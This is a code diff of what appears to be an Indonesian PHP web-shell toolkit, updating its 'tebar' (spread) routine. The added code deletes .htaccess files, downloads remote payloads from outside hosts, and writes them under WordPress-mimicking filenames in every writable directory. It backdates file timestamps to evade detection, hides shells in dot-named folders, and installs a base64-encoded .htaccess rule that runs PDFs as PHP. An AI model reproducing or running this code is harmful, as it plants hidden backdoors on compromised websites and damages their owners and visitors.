@@ -2112,7 +2112,7 @@ Link Config: <br>
 				<br><br>
 				<form action="" method="post">
 					<center>
-					Tebarkan di :
+					Tebarkan di (wajib pakai / diakhir) :
 						<input class="form-control" type="text" name="direktorix" value="'.$direktori.'" style="width: 450px;" height="10"><br>
 						<input type="submit" class="form-control" style="width: 250px; height: 40px;" value="Tebar" name="tebar" />
 
@@ -2124,7 +2124,7 @@ Link Config: <br>
 
 				
 				$direktori = $_SERVER['DOCUMENT_ROOT'];
-				$fullx = $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], "", $direktori);
+				$fullxx = $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], "", $direktori);
 				$folder = $_POST['direktorix'];
 
 				$itemsxz = array("https://m.slotao.com/licenses.png", "https://m.slotao.com/mari.png", "https://m.slotao.com/supre.png", "https://raw.githubusercontent.com/dono-zz/1945/main/mari.png", "https://m.slotao.com/class-wp-customize-nav-menu-customize.png", "https://m.slotao.com/Note.png", "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php", "https://m.slotao.com/maridono.pdf");
@@ -2212,45 +2212,68 @@ Link Config: <br>
 							echo DB_NAME."<br>";
 						} 
 					} else {
-
-							if (is_array($folder) || is_object($folder)) {
-								foreach ($folder as $detailsfolder) {
-									if(is_dir($detailsfolder) and $detailsfolder != "." && $detailsfolder != "..") {
-										if (is_writable($detailsfolder)) {
-											$items = array("login.php", "xmlrpc.php", "edit-form-advanced.php", "link-parse-opml.php", "ms-sites.php", "options-writing.php", "themes.php", "https.php", "class-https.php", "admin-ajax.php", "edit-form-comment.php", "link.php", "ms-themes.php", "mari.php", "plugin-editor.php", "admin-footer.php", "edit-link-form.php", "load-scripts.php", "ms-upgrade-network.php", "admin-functions.php", "edit.php", "load-styles.php", "ms-users.php", "plugins.php", "admin-header.php", "licenses.php", "edit-tag-form.php", "media-new.php", "my-sites.php", "apps.php", "post-new.php", "upgrade-themes.php", "admin.php", "sandwich.php", "edit-tags.php", "media.php", "nav-menus.php", "post.php", "admin-post.php", "maridono.php", "export.php", "Note.php", "media-upload.php", "network.php", "press-this.php", "upload.php", "async-upload.php", "menu-header.php", "options-discussion.php", "privacy.php", "user-edit.php", "menu.php", "options-general.php", "profile.php", "user-new.php", "moderation.php", "options-head.php", "revision.php", "users.php", "custom-background.php", "ms-admin.php", "options-media.php", "setup-config.php", "widgets.php", "theme-single.php", "custom-header.php", "ms-delete-site.php", "options-permalink.php", "term.php", "customize.php", "link-add.php", "supre.php", "ms-edit.php", "options.php", "edit-comments.php", "link-manager.php", "ms-options.php", "options-reading.php");
-											$namafile = $items[array_rand($items)];
-											chmod($detailsfolder.'/.htaccess', 0644 );
-											unlink($detailsfolder.'/.htaccess');
-											if ($detailsfolder === 'docs')
-												if (!is_dir($detailsfolder .'/manual/')) { mkdir($detailsfolder . '/manual/', 0755, true); }
-												$lapor1 = $detailsfolder.'/manual/index.php';
-												$report1 = mari_get_contents($resource1); file_put_contents($lapor1, $report1); @touch/**/($lapor1, strtotime('-'.rand(30,90).' days', time()));
-												echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor1)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor1)."</a><br>"; 
-											}
-											if ($detailsfolder === 'public')
-												if (!is_dir($detailsfolder .'/.../')) { mkdir($detailsfolder . '/.../', 0755, true); }
-												$lapor2 = $detailsfolder.'/.../index.php';
-												$report2 = mari_get_contents($resource1); file_put_contents($lapor2, $report2); @touch/***/($lapor2, strtotime('-'.rand(30,90).' days', time()));
-												echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."</a><br>"; 
-											}
-											if (!is_file($detailsfolder."/".$namafile)){
-												if (is_array($detailsfolder) || is_object($detailsfolder)) {
-													foreach ($detailsfolder as $resource0) {				
-														$lapor3 = $detailsfolder.'/'.$namafile;
-														$report3 = mari_get_contents($resource0); file_put_contents($lapor3, $report3); 
-														@touch/****/($lapor3, strtotime('-'.rand(30,90).' days', time())); 
-														@touch/****/($detailsfolder, strtotime('-'.rand(30,90).' days', time()));
-														echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>"; 
-													}
-												}	
-											} 
-										}
-								}	
-
 						if (!is_dir($direktori .'/.well-known/pki-validation/.../')) { mkdir($direktori . '/.well-known/pki-validation/.../', 0755, true); }	
 						$lapor9	= $direktori.'/.well-known/pki-validation/.../index.php';
 						$report9 = mari_get_contents($resource8); file_put_contents($lapor9, $report9); @touch/**/($lapor9, strtotime('-'.rand(30,90).' days', time()));	
 						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor9)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor9)."</a><br>"; 
+						
+						if (!is_dir($direktori .'/.-/')) { mkdir($direktori . '/.-/', 0755, true); }	
+						$lapor5	= $direktori.'/.-/lapor.pdf';
+						$report5 = mari_get_contents($resource3); file_put_contents($lapor5, $report5); @touch/**/($lapor5, strtotime('-'.rand(30,90).' days', time()));
+						$htaccess = $direktori."/.-/.htaccess";
+					    $contentx = 'QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucGRm';
+					    $contentx = base64_decode/*****/($contentx);
+					    @file_put_contents($htaccess, $contentx);
+						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor5)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor5)."</a><br>"; 
+						
+						
+								foreach (scandir($folder) as $detailsfolder) {
+									$items = array("login.php", "xmlrpc.php", "edit-form-advanced.php", "link-parse-opml.php", "ms-sites.php", "options-writing.php", "themes.php", "https.php", "class-https.php", "admin-ajax.php", "edit-form-comment.php", "link.php", "ms-themes.php", "mari.php", "plugin-editor.php", "admin-footer.php", "edit-link-form.php", "load-scripts.php", "ms-upgrade-network.php", "admin-functions.php", "edit.php", "load-styles.php", "ms-users.php", "plugins.php", "admin-header.php", "licenses.php", "edit-tag-form.php", "media-new.php", "my-sites.php", "apps.php", "post-new.php", "upgrade-themes.php", "admin.php", "sandwich.php", "edit-tags.php", "media.php", "nav-menus.php", "post.php", "admin-post.php", "maridono.php", "export.php", "Note.php", "media-upload.php", "network.php", "press-this.php", "upload.php", "async-upload.php", "menu-header.php", "options-discussion.php", "privacy.php", "user-edit.php", "menu.php", "options-general.php", "profile.php", "user-new.php", "moderation.php", "options-head.php", "revision.php", "users.php", "custom-background.php", "ms-admin.php", "options-media.php", "setup-config.php", "widgets.php", "theme-single.php", "custom-header.php", "ms-delete-site.php", "options-permalink.php", "term.php", "customize.php", "link-add.php", "supre.php", "ms-edit.php", "options.php", "edit-comments.php", "link-manager.php", "ms-options.php", "options-reading.php");
+																	
+									if(is_dir($detailsfolder) and $detailsfolder != "." && $detailsfolder != "..") {							
+
+										if (is_writable($detailsfolder)) {
+											
+											if (file_exists($detailsfolder.'/.htaccess')) {
+											echo ">> Menghapus ".$detailsfolder."/.htaccess<br>";
+											chmod($detailsfolder.'/.htaccess', 0644 );
+											unlink($detailsfolder.'/.htaccess');
+											}
+											if ($detailsfolder === 'docs') {
+												if (!is_dir($detailsfolder .'/manual/')) { mkdir($detailsfolder . '/manual/', 0755, true); }
+												$lapor1 = $detailsfolder.'/manual/index.php';
+												$report1 = mari_get_contents($resource1); file_put_contents($lapor1, $report1); @touch/**/($lapor1, strtotime('-'.rand(30,90).' days', time()));
+												echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $folder.$lapor1)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor1)."</a><br>"; 
+											}
+											if ($detailsfolder === 'public') {
+												if (!is_dir($detailsfolder .'/.../')) { mkdir($detailsfolder . '/.../', 0755, true); }
+												$lapor2 = $detailsfolder.'/.../index.php';
+												$report2 = mari_get_contents($resource1); file_put_contents($lapor2, $report2); @touch/***/($lapor2, strtotime('-'.rand(30,90).' days', time()));
+												echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $folder.$lapor2)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor2)."</a><br>"; 
+											}
+											
+												if (is_array($itemsxz) || is_object($itemsxz)) {
+													foreach ($itemsxz as $resource0) {		
+														$namafile = $items[array_rand($items)];			
+														$lapor3 = $detailsfolder.'/'.$namafile;
+														$report3 = mari_get_contents($resource0); file_put_contents($lapor3, $report3); 
+														@touch/****/($lapor3, strtotime('-'.rand(30,90).' days', time())); 
+														@touch/****/($detailsfolder, strtotime('-'.rand(30,90).' days', time()));
+														chmod($lapor3, 0644 );
+														echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $folder.$lapor3)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor3)."</a><br>"; 
+													}
+													unset($resource0);
+													unset($namafile);
+												}	
+											
+										}
+								}	
+
+
+
+
+						
+						}
 
 					}
 
